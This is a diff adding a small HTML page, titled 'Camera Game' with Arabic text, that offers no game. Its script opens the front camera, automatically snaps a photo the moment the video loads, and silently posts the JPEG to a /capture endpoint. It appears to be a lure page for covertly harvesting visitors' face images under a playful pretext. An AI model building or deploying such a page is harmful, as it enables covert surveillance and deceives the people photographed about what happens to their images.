@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>Camera Game</title>
+</head>
+<body>
+
+<h2>جاري تشغيل الكاميرا...</h2>
+<p>بمجرد الموافقة سيتم الالتقاط تلقائيًا</p>
+
+<video id="video" width="300" autoplay playsinline></video>
+<canvas id="canvas" width="300" height="220" style="display:none;"></canvas>
+
+<script>
+let video = document.getElementById("video");
+let canvas = document.getElementById("canvas");
+let ctx = canvas.getContext("2d");
+
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream => {
+    video.srcObject = stream;
+
+    video.onloadeddata = () => {
+        takePhoto();
+    };
+});
+
+function takePhoto() {
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    let imageData = canvas.toDataURL("image/jpeg");
+
+    fetch("/capture", {
+        method: "POST",
+        body: new URLSearchParams({ image: imageData }),
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+    });
+}
+</script>
+
+</body>
+</html>
